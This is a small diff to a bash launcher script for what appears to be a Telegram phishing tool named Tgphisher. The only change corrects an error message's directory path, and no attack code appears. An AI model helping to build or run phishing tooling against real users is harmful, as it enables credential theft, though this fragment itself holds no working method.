@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 
-cd /root/Tgphisher || { echo "Failed to enter the directory => /root/werbot"; exit 1; }
+cd /root/Tgphisher || { echo "Failed to enter the directory => /root/Tgphisher"; exit 1; }
 
 tgphisher(){
   case "$1 $2" in
